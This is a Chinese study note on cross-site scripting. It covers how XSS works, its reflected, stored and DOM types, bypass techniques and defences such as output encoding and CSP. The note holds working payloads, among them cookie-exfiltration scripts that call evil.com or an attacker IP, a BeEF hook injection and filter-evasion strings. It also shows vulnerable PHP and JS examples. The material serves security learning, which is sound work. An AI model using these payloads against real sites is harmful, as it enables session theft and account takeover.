# 2026-08-02 XSS 跨站脚本攻击 — 认知框架

> 🧠 **[打开交互式思维导图](https://monney-sys.github.io/daily-learning/mindmaps/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC.html)**（滚轮缩放 · 拖拽平移 · 点击折叠分支）

## 一、原理

### 1.1 XSS 是什么？

XSS（Cross-Site Scripting，跨站脚本攻击）的本质：

> **攻击者让受害者的浏览器执行了不该执行的 JavaScript。**

它和 SQL 注入同理——用户输入的数据没有被正确处理，当成了"代码"来执行。区别在于：

| | SQL 注入 | XSS |
|------|----------|-----|
| **执行位置** | 数据库服务器 | 用户浏览器（前端） |
| **攻击目标** | 数据库（偷数据、改数据） | 其他用户（盗 cookie、钓鱼） |
| **注入内容** | SQL 语句 | HTML / JavaScript |

### 1.2 产生原因

一句话：**用户输入被原样拼进 HTML，浏览器分不清"数据"和"代码"。**

```php
// ❌ 有漏洞的代码
$keyword = $_GET['q'];
echo "<p>搜索结果：$keyword</p>";

// 用户输入：<script>alert(1)</script>
// 输出 HTML：<p>搜索结果：<script>alert(1)</script></p>
// 浏览器解析：哦，这有个 <script> 标签，我要执行它 → alert(1) 弹窗
```

浏览器解析 HTML 时按标签语义执行：
- 看到 `<script>` → 执行 JS 代码
- 看到 `<img src=x onerror=...>` → 加载失败时执行 `onerror` 里的代码
- 看到 `<a href="javascript:...">` → 点链接时执行 JS

攻击者的目标就是**闭合前文标签，插入自己的 HTML/JS**，让浏览器执行。

### 1.3 危害影响

| 危害 | 具体场景 |
|------|----------|
| **盗取 Cookie** | `<script>fetch('http://evil.com/?c='+document.cookie)</script>` → 拿到 cookie 后伪装成受害者登录 |
| **钓鱼弹窗** | 伪造登录框，诱导受害者输入密码 |
| **页面篡改** | `document.body.innerHTML = '网站已挂'` — 挂黑页 |
| **劫持操作** | 在后台管理页面执行 JS，以管理员身份删除用户/修改配置 |
| **蠕虫传播** | 存储型 XSS，每个访问的用户自动转发（如新浪微博 XSS 蠕虫事件） |
| **浏览器漏洞利用** | 配合浏览器 0day 实现 RCE（罕见，但存在） |
| **端口扫描内网** | JS 发起对内网 IP 的请求，探测内部服务 |

---

## 二、分类

| 类型 | 恶意代码存放位置 | 是否需要诱导点击 | 影响范围 | 一句话 |
|------|-----------------|:---:|------|------|
| **反射型** | URL 参数 | ✅ | 单用户（点链接的人） | 传什么就回显什么 |
| **存储型** | 数据库 / 文件 | ❌ | 所有访问页面的用户 | 存进去，谁看谁中招 |
| **DOM 型** | URL 片段（`#`）| ✅ | 单用户 | 纯前端自己坑自己，服务器不知情 |

### 2.1 反射型 XSS

```
攻击者 → 构造恶意 URL → 发给受害者 → 受害者点击
→ 服务器把参数原样拼进 HTML 返回 → 浏览器执行脚本
```

```url
https://example.com/search?q=<script>alert(1)</script>
```

特点：一次性，需要社工（钓鱼邮件/聊天链接）。最常见，但危害相对可控。

### 2.2 存储型 XSS

```
攻击者 → 提交恶意脚本（评论/昵称/私信）→ 服务器存进数据库
→ 任何用户访问页面 → 服务器从数据库读出来拼进 HTML → 所有人中招
```

```html
<!-- 攻击者在评论区提交 -->
<script>
fetch('http://evil.com/?' + document.cookie)
</script>
```

特点：持久化，一对多，危害最大。不需要诱导——用户正常浏览就中招。是漏洞挖掘的首选目标。

### 2.3 DOM 型 XSS

```
攻击者 → 构造带 # 的 URL → 发给受害者 → 点击
→ 服务器返回正常 HTML（没有任何恶意内容）
→ 页面中的 JS 从 URL 取参数 → 用 innerHTML/document.write 写进 DOM → 执行
```

```javascript
// 页面自带的漏洞代码
var name = location.hash.substring(1);           // 从 # 后取值
document.getElementById('welcome').innerHTML = name;  // 危险！直接写入 HTML
```

```url
https://example.com/page#<img src=x onerror=alert(1)>
```

特点：服务端完全干净，WAF 和日志都看不到攻击。难检测，需要审计前端 JS 代码。

---

## 三、利用手法

### 3.1 常用 Payload

```html
<!-- ① 最基础 — <script> 标签 -->
<script>alert(1)</script>
<script>alert(document.cookie)</script>

<!-- ② 标签事件 — 绕 <script> 过滤 -->
<img src=x onerror="alert(1)">
<body onload="alert(1)">
<svg onload="alert(1)">
<video src=x onerror="alert(1)">

<!-- ③ 伪协议 — 用于 <a> / <iframe> -->
<a href="javascript:alert(1)">点我</a>
<iframe src="javascript:alert(1)">

<!-- ④ 偷 cookie（实际攻击 Payload） -->
<script>
fetch('http://攻击机IP:端口/?' + document.cookie)
</script>
<script>
new Image().src = 'http://攻击机IP:端口/?' + document.cookie
</script>

<!-- ⑤ 无括号绕过滤（部分场景） -->
<script>onerror=alert;throw 1</script>
```

### 3.2 XSS 平台

用于 Blind XSS（你不知道什么时候触发，需要回连收集信息）：

| 平台 | 说明 |
|------|------|
| [**XSS Hunter**](https://xsshunter.com/) | 在线服务，注入后自动截图、收集 cookie、DOM |
| [**BeEF**](https://beefproject.com/) | 浏览器利用框架（Browser Exploitation Framework），注入 hook.js 后可以操控受害浏览器 |
| [**ezXSS**](https://github.com/ssl/ezXSS) | 自托管，PHP 部署 |

**BeEF 工作流程**：
```
XSS 注入 → <script src="http://攻击机:3000/hook.js"></script>
                    ↓
     BeEF 控制台看到"上线"的浏览器
                    ↓
     可操作：弹窗 / 重定向 / 获取浏览器指纹 / 检测插件 / 社攻
```

### 3.3 XSS 扫描/测试工具

| 工具 | 特点 |
|------|------|
| **XSStrike** | Python，智能模糊测试，WAF 检测与绕过，Payload 质量高 |
| **Dalfox** | Go，速度快，支持参数自动发现、DOM XSS 检测 |
| **XSSer** | 老牌工具，支持 GET/POST，内置绕过规则 |
| **Burp Suite** | 集成度高，Repeater 手动测试 + Scanner 自动检测 |
| **F12 DevTools** | 最重要的"工具"——手动测试、看 DOM、调试 JS |

### 3.4 XSS 结合其他漏洞

| 组合方式 | 效果 |
|----------|------|
| **XSS + CSRF** | 管理员浏览页面时，JS 自动发起删除用户/修改密码的请求 |
| **XSS + 文件上传** | 通过 XSS 控制管理员浏览器上传 webshell |
| **XSS + SQL 注入** | 在 SQL 注入无回显（盲注）时，用 XSS 把数据"带出来" |
| **XSS + SSRF** | 通过 JS 从浏览器端探测内网端口和服务 |
| **XSS + 社工** | 伪造登录页面，窃取凭据 |

---

## 四、绕过手法

### 4.1 代码过滤绕过

防御方常对用户输入做过滤（替换 `script`、`alert` 等），绕过思路：

```html
<!-- ① 大小写混淆 -->
<Script>alert(1)</sCript>
<IMG SRC=x Onerror="alert(1)">

<!-- ② 双写绕过（过滤只做一次替换） -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<!-- 过滤掉中间的 <script> → 两边拼接恢复 <script> -->

<!-- ③ 编码绕过 -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">  ← HTML 实体编码
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">  ← javascript 编码后

<!-- ④ 标签/事件替换（过滤了 <script>） -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onpageshow=alert(1)>
<details open ontoggle=alert(1)>

<!-- ⑤ 拼接/动态构造 -->
<script>eval('al'+'ert(1)')</script>
<script>window['al'+'ert'](1)</script>

<!-- ⑥ 使用 String.fromCharCode -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

### 4.2 HttpOnly 的作用与绕过

```http
Set-Cookie: session=abc123; HttpOnly; Secure
```

| 没有 HttpOnly | 有 HttpOnly |
|:---:|:---:|
| `document.cookie` 能读到 cookie | `document.cookie` 读不到 cookie |
| XSS 可直接偷 cookie | XSS **无法偷 cookie** |

**HttpOnly 不是银弹**——即使开了 HttpOnly，XSS 依然能做：

- 劫持页面操作（以受害者身份发请求，cookie 自动带上）
- 钓鱼弹窗（诱导受害者主动输入密码）
- 修改页面内容（挂黑页/挖矿脚本）
- 探测内网

> **HttpOnly 让 XSS 从"偷钥匙"变成"趁主人在家用钥匙"**——cookie 偷不到，但可以用。

### 4.3 WAF 绕过

| 绕法 | 示例 |
|------|------|
| **标签变异** | WAF 封了 `<script>` → 用 `<img onerror>` / `<svg onload>` |
| **大小写** | `<ScRiPt>`（WAF 正则可能不区分大小写，但不能依赖） |
| **编码** | `alert` 写为 `alert`（Unicode 编码） |
| **换行/空白** | `<img src=x onerror = alert(1)>`（多余空格扰乱正则） |
| **数据溢出** | URL 超长（WAF 有检测长度上限）|

---

## 五、安全修复方案

### 5.1 输入过滤（入口）

```php
// ❌ 不要幻想用正则"清洗"所有恶意输入——攻击者总能绕过
$input = preg_replace('/<script>/i', '', $_GET['q']);  // 形同虚设

// ✅ 正确的做法：只接受你预期内的数据
// 如果是年龄 → 只接受数字
$age = filter_var($_GET['age'], FILTER_VALIDATE_INT);
// 如果是用户名 → 只接受字母数字+下划线
if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) die('非法输入');
```

### 5.2 输出编码（出口）— 最重要

根据输出**上下文**选择合适的编码方式：

| 输出位置 | 正确做法 | 错误做法 |
|----------|----------|----------|
| HTML 标签之间 `<p>输出</p>` | `htmlspecialchars($str, ENT_QUOTES, 'UTF-8')` | 直接 `echo $str` |
| HTML 属性 `<input value="输出">` | 同上 + 属性值加引号 | 属性值不加引号 |
| JavaScript 中 `var x = '输出'` | `json_encode($str)` | 直接拼接 |
| URL 参数中 `<a href="?q=输出">` | `urlencode($str)` | 直接拼接 |
| CSS 中 | 尽量避免用户输入进入 CSS | — |

**PHP 示例**：
```php
// ✅ 输出到 HTML 内容中：用 htmlspecialchars
$name = $_GET['name'];
echo '<p>你好，' . htmlspecialchars($name, ENT_QUOTES, 'UTF-8') . '</p>';
// 用户输入 <script>alert(1)</script>
// 浏览器看到：&lt;script&gt;alert(1)&lt;/script&gt;
// → 被渲染为纯文本，不会执行

// ✅ 输出到 JavaScript 中：用 json_encode
$user = $_GET['user'];
echo '<script>var username = ' . json_encode($user) . ';</script>';
// json_encode 会自动转义引号，防止突破 <script> 上下文
```

### 5.3 安全响应头

| 响应头 | 作用 | 配置 |
|--------|------|------|
| **HttpOnly** | cookie 对 JS 不可见 | `Set-Cookie: ...; HttpOnly` |
| **CSP**（Content-Security-Policy）| 白名单控制哪些脚本可以执行 | 见下方 |
| **X-XSS-Protection** | 浏览器内置 XSS 过滤器（Chrome 已废弃，仅供参考） | `X-XSS-Protection: 1; mode=block` |

**CSP 详解**：
```nginx
# 最严格的 CSP：只允许本站脚本 + 禁止内联脚本
Content-Security-Policy: script-src 'self'

# 实际生产环境示例
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; style-src 'self' 'unsafe-inline'
```

```html
<!-- 也可以在 HTML 里设置 -->
<meta http-equiv="Content-Security-Policy" content="script-src 'self'">
```

> ⚠️ CSP 配置后，内联的 `<script>alert(1)</script>` 会被浏览器直接拒绝执行。即使攻击者注入成功，脚本也不跑。

### 5.4 纵深防御总结

```
第一层：输入校验 — 只接受预期格式的数据，拒绝所有不符合的
    ↓ 被绕过
第二层：输出编码 — htmlspecialchars / urlencode / json_encode（核心防线）
    ↓ 被绕过
第三层：HttpOnly Cookie — 保护 cookie 不被 JS 读取
    ↓ 被绕过
第四层：CSP — 浏览器层面禁止非授权脚本执行
```

> ⚠️ XSS 的防御核心永远是**输出编码**，不要幻想"过滤危险字符就能安全"——黑洞名单永远能被绕过。

---

## 六、总结

### 核心认知

- XSS 的本质：**用户输入被当成了代码执行**（和 SQL 注入同理，只是执行位置在浏览器）
- 分类记得住：**反射型**（一次性，需要点链接）、**存储型**（存数据库，所有人中招）、**DOM 型**（纯前端坑自己）
- 绕过靠发散：标签不止 `<script>`，还有 `<img onerror>` / `<svg onload>` 等各种事件
- 防御靠输出编码：`htmlspecialchars()` 是最核心的防线，HttpOnly 和 CSP 是辅助

### 关联笔记

- [文件上传漏洞体系总览](./2026-07-31-文件上传漏洞.md) — 文件上传 + XSS 的组合利用
- [SQL 注入基础](./2026-07-26-SQL注入基础.md) — 同为注入类漏洞，对比理解

### 待深入

- [ ] DVWA / Pikachu 靶场 XSS 关卡逐个练习
- [ ] BeEF 搭建与实操
- [ ] XSStrike / Dalfox 工具实战
- [ ] CSP 绕过技巧深入学习
- [ ] XSS 与 CSRF 组合利用

> ⚠️ 声明：以上技术仅用于授权靶场和渗透测试授权目标，未经授权使用属于违法行为。
